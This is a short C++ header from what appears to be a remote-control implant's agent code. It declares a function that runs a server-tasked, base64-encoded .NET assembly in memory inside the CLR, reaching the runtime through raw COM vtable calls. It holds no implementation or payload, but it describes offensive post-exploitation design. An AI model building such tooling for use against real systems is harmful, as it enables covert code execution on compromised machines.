// ========================================== { START OF FILE } ========================================== //
#pragma once

#include "agent/commands/command_result.h"
#include "agent/models/checkin_models.h"

namespace agent::commands::exec {

    /// Loads the base64 <c>Command.Assembly</c> into the v4.0.30319 CLR's default AppDomain and invokes
    /// its entry point with <c>Command.Arguements</c> as the argument vector (NET_ASM).
    ///
    /// The CLR host is reached with raw COM vtable calls whose slot offsets are read from the runtime's
    /// own mscorlib.tlb at runtime — see src/commands/exec/netasm.cpp for the reference and the design.
    CommandResult ExecuteNetAssembly(const models::CheckinResponse& task);

}  // namespace agent::commands::exec
// ========================================== { END OF FILE } ========================================== //
